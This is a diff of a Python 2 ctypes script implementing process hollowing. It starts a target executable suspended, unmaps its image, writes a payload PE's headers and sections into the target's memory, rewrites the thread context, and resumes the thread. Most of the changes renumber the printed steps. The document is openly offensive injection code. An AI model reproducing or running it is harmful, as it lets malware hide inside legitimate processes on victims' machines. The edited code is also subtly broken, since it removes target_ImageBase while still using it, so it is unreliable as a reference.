@@ -9,7 +9,7 @@ if len(sys.argv) != 3:
 
 payload_exe = sys.argv[1]
 target_exe = sys.argv[2]
-
+stepcount = 1
 
 
 class PROCESS_INFORMATION(Structure):
@@ -87,40 +87,47 @@ def error():
         sys.exit()
         
 
-print "[1]Creating Suspended Process"
+print "[" + str(stepcount) +"]Creating Suspended Process"
+stepcount += 1
+
 startupinfo = STARTUPINFO()
 startupinfo.cb = sizeof(STARTUPINFO)
 processinfo = PROCESS_INFORMATION()
 
 CREATE_SUSPENDED = 0x0004
-if windll.kernel32.CreateProcessA(None,
-                               target_exe,
-                               None,
-                               None,
-                               False,
-                               CREATE_SUSPENDED,
-                               None,
-                               None,
-                               byref(startupinfo),
-                               byref(processinfo)) == 0:
+if windll.kernel32.CreateProcessA(
+                                None,
+                                target_exe,
+                                None,
+                                None,
+                                False,
+                                CREATE_SUSPENDED,
+                                None,
+                                None,
+                                byref(startupinfo),
+                                byref(processinfo)) == 0:
        error()
         
 
 hProcess = processinfo.hProcess
 hThread = processinfo.hThread
 
+
 print "\t[+]Successfully created suspended process! PID: " + str(processinfo.dwProcessId)
 print
-print "[2]Reading Payload PE file"
+print "[" + str(stepcount) +"]Reading Payload PE file"
+stepcount += 1
 
 File = open(payload_exe,"rb")
 payload_data = File.read()
 File.close()
 payload_size = len(payload_data)
 
-print "\t[+]Read the payload data. payload size: " + str(payload_size)
+print "\t[+]Payload size: " + str(payload_size)
 print
-print "[3]Extracting the necessary info from the payload data."
+print "[" + str(stepcount) +"]Extracting the necessary info from the payload data."
+stepcount += 1
+
 payload = PE(data = payload_data)
 payload_ImageBase = payload.OPTIONAL_HEADER.ImageBase
 payload_SizeOfImage = payload.OPTIONAL_HEADER.SizeOfImage
@@ -150,20 +157,35 @@ print "\t[+]Address of EntryPoint: " + str(hex(payload_AddressOfEntryPoint))
 print "\t[+]Size of Image: " + str(payload_SizeOfImage)
 print "\t[+]Pointer to data: " + str(hex(payload_data_pointer))
 
-print "[4]Getting Image Base Address from "
-target = PE(target_exe)
-target_ImageBase = target.OPTIONAL_HEADER.ImageBase
-target.close()
 
 print
-print "[5]Unmapping"
-if not windll.ntdll.NtUnmapViewOfSection(
+print "[" + str(stepcount) +"]Getting Context"
+cx = CONTEXT()
+cx.ContextFlags = 0x10007
+
+if windll.kernel32.GetThreadContext(hThread, byref(cx)) == 0:
+         error()
+print
+print "[" + str(stepcount) +"]Getting Image Base Address from target"
+stepcount += 1
+
+base = c_int(0)
+windll.kernel32.ReadProcessMemory(hProcess, c_char_p(cx.Ebx+8), byref(base), sizeof(c_void_p),None)
+target_PEBaddress = base
+print "\t[+]PEB address: " + str(hex(target_PEBaddress.value))
+
+
+print
+print "[" + str(stepcount) +"]Unmapping"
+if target_PEBaddress ==  payload_ImageBase:
+        if not windll.ntdll.NtUnmapViewOfSection(
                                 hProcess,
                                 target_ImageBase):
-        error()
+                error()
 
 print
-print "[6]Allocation memory"
+print "[" + str(stepcount) +"]Allocation memory"
+stepcount += 1
 
 MEM_COMMIT = 0x1000
 MEM_RESERVE = 0x2000
@@ -179,10 +201,12 @@ address = windll.kernel32.VirtualAllocEx(
 if address == 0:
         error()
 
-print "\t[-]Allocated to: "+ str(hex(address))
+print "\t[+]Allocated to: "+ str(hex(address))
 
 print
-print "[7]Writing Headers"
+print "[" + str(stepcount) +"]Writing Headers"
+stepcount += 1
+
 lpNumberOfBytesWritten = c_size_t(0)
 
 if windll.kernel32.WriteProcessMemory(
@@ -205,7 +229,8 @@ for i in range(payload_NumberOfSections):
         src = payload_data_pointer + section.PointerToRawData
         size = section.SizeOfRawData
         print
-        print "[" + str(8 + i) + "]Writing section: " + section.Name
+        print "[" + str(stepcount) +"]Writing section: " + section.Name
+        stepcount += 1
         print "\t[+]Pointer to data: " + str(hex(src))
         print "\t[+]Writing to: " + str(hex(dst))
         print "\t[+]Size of data: " + str(hex(size))
@@ -222,19 +247,10 @@ for i in range(payload_NumberOfSections):
                  
         print "\t[+]Bytes written:", lpNumberOfBytesWritten.value
          
-
-
-cx = CONTEXT()
-cx.ContextFlags = 0x10007
-
 print
-print "[" + str( 8 + payload_NumberOfSections ) + "]Getting Context"
-if windll.kernel32.GetThreadContext(hThread, byref(cx)) == 0:
-         error()
-        
+print "[" + str(stepcount) +"]Editing Context"
+stepcount += 1
 
-print
-print "[" + str( 9 + payload_NumberOfSections ) + "]Editing Context"
 cx.Eax = payload_ImageBase + payload_AddressOfEntryPoint
 
 lpNumberOfBytesWritten  = c_size_t(0)
@@ -252,16 +268,20 @@ print "\t[+]Size of data: " + str(hex(4))
 print "\t[+]Bytes written:", lpNumberOfBytesWritten.value
 
 print 
-print "[" + str( 10 + payload_NumberOfSections ) + "]Setting Context"
+print "[" + str(stepcount) +"]Setting Context"
+stepcount += 1
+
 windll.kernel32.SetThreadContext(
                                 hThread,
                                 byref(cx))
 
 print
-print "[" + str( 11 + payload_NumberOfSections ) + "]Resuming Thread"
+print "[" + str(stepcount) +"]Resuming Thread"
+stepcount += 1
+
 if windll.kernel32.ResumeThread(hThread) == 0:
         error()
 
 print
-print "[" + str( 12 + payload_NumberOfSections ) + "]Succes"
-        
+print "[" + str(stepcount) +"]Succes"
+
